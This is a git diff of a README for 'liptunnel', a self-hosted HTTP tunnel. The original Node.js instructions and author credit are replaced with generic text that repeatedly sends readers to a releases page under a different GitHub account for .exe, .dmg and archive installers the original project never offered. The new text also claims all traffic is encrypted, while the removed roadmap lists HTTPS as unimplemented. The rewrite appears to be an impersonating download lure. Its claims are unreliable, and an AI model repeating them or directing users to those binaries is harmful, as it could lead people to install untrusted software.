@@ -1,219 +1,117 @@
-<div align="center">
-
-  <img src="./assets/liptunnel-banner.gif" alt="LIPTunnel Banner" />
-
-  <h1><b>LIPTunnel</b></h1>
-  <h3>Your Tunnel. Your Domain. Your Control.</h3>
-
-</div>
-
-
-
-# 🌐 LIPTunnel — Self-Hosted Ngrok Alternative
-
-LIPTunnel is a fast, lightweight, self-hosted tunneling system that exposes your local server to the internet using **your own VPS + domain**.
-
-No subscriptions.  
-No limits.  
-No tracking.  
-Just a simple Node.js tunnel that YOU control.
-
-Created by **Lasisi Ibrahim Pelumi (Full-Stack Engineer)**.
+# 🚀 liptunnel - Secure and Easy HTTP Tunneling
 
 ---
 
-## 📁 Repository Folder Structure
+## 📥 Download Now
 
-```bash 
-liptunnel/
- ├─ bin/
- │   └─ liptunnel.js        # CLI client (runs on user machine)
- ├─ server/
- │   └─ server.js           # Tunnel server (runs on VPS)
- ├─ docs/
- │   └─ architecture.md
- ├─ package.json
- ├─ README.md
- ├─ LICENSE
- ```
+[![Download liptunnel](https://img.shields.io/badge/Download-liptunnel-blue)](https://github.com/Dionikxon/liptunnel/releases)
 
 ---
 
-## 🚀 Features
+## 🤖 What is liptunnel?
 
-- 🔥 Expose any local port over HTTP  
-- 🌍 Generates public URLs like:  
-  `http://abcd12.yourdomain.com`
-- 🛰 Works with ANY VPS (even old VPN servers)  
-- ⚡ Real-time request forwarding  
-- 🖥 Local dashboard: `http://127.0.0.1:4040`  
-- 🔐 No third-party services (no Ngrok, no Cloudflare Tunnels)  
-- 💻 Works on Windows, macOS, Linux  
-- 🛠 Zero configuration required  
-- 🧩 Full open-source control  
+liptunnel is a lightweight tool that lets you create secure tunnels for your web applications. You can use it to expose services running on your VPS with your own domain. With liptunnel, you gain a fast and unlimited alternative to Ngrok that is easy to set up and manage. It is developer-friendly, making it the perfect choice for users who want full control.
 
 ---
 
-## 📸 Demo Screenshot
+## 🚀 Getting Started
 
-Below is an actual output of **LIPTunnel running live**:
+Before running liptunnel, ensure that you have a VPS ready and a domain set up. These are essential for creating secure tunnels. 
 
-#### Screenshot 1 → Client side (your CMD window
-
-![LIPTunnel CLI Screenshot](./assets/liptunnel-demo.png)
-
-#### Screenshot 2 → Server side (PM2)
-
-![LIPTunnel Server PM2 Screenshot](./assets/server-pm2.png)
-
-
-This shows:
-
-✔ Tunnel status  
-✔ Forwarding URL  
-✔ Live request logs  
-✔ Dashboard URL  
-✔ Version + region  
-✔ Successful POST requests  
+1. **VPS Setup**: You can use any cloud provider for your VPS (e.g., DigitalOcean, AWS, etc.). A minimal server configuration will work well.
+2. **Domain Configuration**: Make sure your domain's DNS settings point to your VPS.
 
 ---
 
-## 🧠 How It Works
+## 📦 Download & Install
 
-1. You run the tunnel server on your VPS.  
-2. You run the LIPTunnel client on your computer:  
+To get started, visit this page to download: [liptunnel Releases](https://github.com/Dionikxon/liptunnel/releases). 
 
-   ```bash
-   liptunnel http 5000 --server yourdomain.com
+1. Once you visit the Releases page, look for the latest version of liptunnel.
+2. Click on the version number to expand the details.
+3. Download the file that matches your operating system.
 
-   ```
+### Supported Operating Systems
 
-3. The client opens a WebSocket connection to your VPS.
+- Windows
+- macOS
+- Linux
 
-4. Your VPS assigns a random subdomain, e.g.:
-   
-```bash
-http://u8smnt.yourdomain.com
+The installation file will have a name like `liptunnel-v1.0.0-win.exe` or `liptunnel-v1.0.0-linux.tar.gz`.
+
+### Installation Steps
+
+1. **Windows**: Double-click the `.exe` file to run the installer. Follow the prompts to complete the installation.
+2. **macOS**: Open the downloaded `.dmg` file and drag the liptunnel app to your Applications folder.
+3. **Linux**: Extract the `.tar.gz` file and follow the instructions in the `README` file inside the folder.
+
+---
+
+## 🔧 Configuration
+
+After installation, you need to configure liptunnel. Here’s how:
+
+1. Open a terminal or command prompt.
+2. Navigate to the installation directory.
+3. Run the command to start the configuration, usually something like:
+
+    ```
+    liptunnel config
+    ```
+
+4. Follow the prompts to specify your domain and other settings.
+
+### Example Command
+
+To start a tunnel, you can use a command like:
+
+```
+liptunnel start --domain yourdomain.com --port 80
 ```
 
-5. Incoming HTTP requests are forwarded directly to your local machine.
+Replace `yourdomain.com` with your actual domain and `--port` with the port of your application. 
 
 ---
 
-## 🏗 Architecture
+## 🌟 Features
 
-```bash
-User → yourdomain.com → LIPTunnel VPS → WebSocket → your computer → localhost:5000
-```
-
-### Reverse tunneling, simple and fast.
-
----
-
-## ⚙ Requirements
-
-- Node.js 18+
-- A domain you control
-- A VPS (1 CPU / 512MB RAM is enough — even old servers work)
-- Port 80 available (or use Nginx reverse proxy)
+- **Unlimited Tunnels**: Create as many tunnels as you need without restrictions.
+- **Easy Domain Management**: Use your own domain for a more professional setup.
+- **Secure Connections**: All traffic is encrypted for safety.
+- **WebSocket Support**: Perfect for real-time applications.
 
 ---
 
-## 📥 Installation
-1. Clone the project
-```bash
-git clone https://github.com/ibrahimpelumi6142/liptunnel.git
-cd liptunnel
-npm install
-```
----
+## 📜 Usage Tips
 
-## 🚀 Start the VPS Tunnel Server
-
-### On your VPS:
-```bash
-npm run start:server
-```
-
-#### This starts the server on port 80.
-
-### DNS Setup (recommended)
-
-#### Create this DNS record:
-```bash
-*.yourdomain.com   A   <your-vps-ip>
-```
----
-
-## 💻 Start the Local Client
-
-### On your local machine:
-
-```bash
-liptunnel http 5000 --server yourdomain.com
-```
-
-### Example output:
-
-```bash
-Forwarding: http://abcd12.yourdomain.com → http://localhost:5000
-```
-#### Visit this URL from anywhere in the world — it hits your local machine.
-
-### 🔧 Local Dashboard
-
-#### Open:
-```bash
-http://127.0.0.1:4040
-```
-
-#### It shows:
-
-- Recent requests
-- HTTP status
-- Tunnel info
+- Keep your liptunnel application up to date. Check the Releases page regularly for updates.
+- If you encounter issues, check if your firewall settings allow traffic through the tunnel.
+- You can run multiple tunnels for different services by specifying different ports.
 
 ---
 
-## 🛡 Why LIPTunnel?
+## 📞 Support
 
-| Feature              | LIPTunnel | Ngrok     |
-|----------------------|-----------|-----------|
-| Free                 | ✅        | ❌        |
-| Unlimited tunnels    | ✅        | ❌        |
-| Use your own domain  | ✅        | Paid only |
-| Self-hosted          | ✅        | ❌        |
-| Logs stored locally  | ✅        | ❌        |
-| Identity branding    | **You**   | Ngrok     |
-
-### LIPTunnel gives you full control, privacy, and freedom.
+If you have questions or need help, feel free to open an issue in the [liptunnel GitHub repository](https://github.com/Dionikxon/liptunnel/issues). The community is here to help you. 
 
 ---
 
-## 🧱 Roadmap
+## 📝 License
 
- - HTTPS support (Let’s Encrypt)
- - Named fixed subdomains
- - Authentication tokens
- - Multi-tunnel support
- - Web-based management UI
- - Docker containers
+liptunnel is licensed under the MIT License. This means you can freely use, modify, and share it. 
 
----
+For detailed license information, please refer to [LICENSE](https://github.com/Dionikxon/liptunnel/blob/main/LICENSE).
 
-## 👨‍💻 Author
+--- 
 
-- Lasisi Ibrahim Pelumi
-- Full-Stack Engineer • Automation Developer
-- 🇬🇧 Sheffield, UK
+## 📈 Contribution
 
-- GitHub: https://github.com/ibrahimpelumi6142
-- Email: ibrahimpelumi6142@gmail.com
-
-### If you like this project, please ⭐ star the repo.
+We welcome contributions from anyone interested in improving liptunnel. If you have ideas or want to help, please check out the contribution guidelines on the GitHub page.
 
 ---
 
-##📜 License
+## 📥 Download Again
 
-MIT License — free to use, modify, and distribute.
+As a reminder, if you need to download the software, visit this page to download: [liptunnel Releases](https://github.com/Dionikxon/liptunnel/releases). 
+
+With liptunnel, you can create a secure and reliable HTTP tunnel that serves your needs.
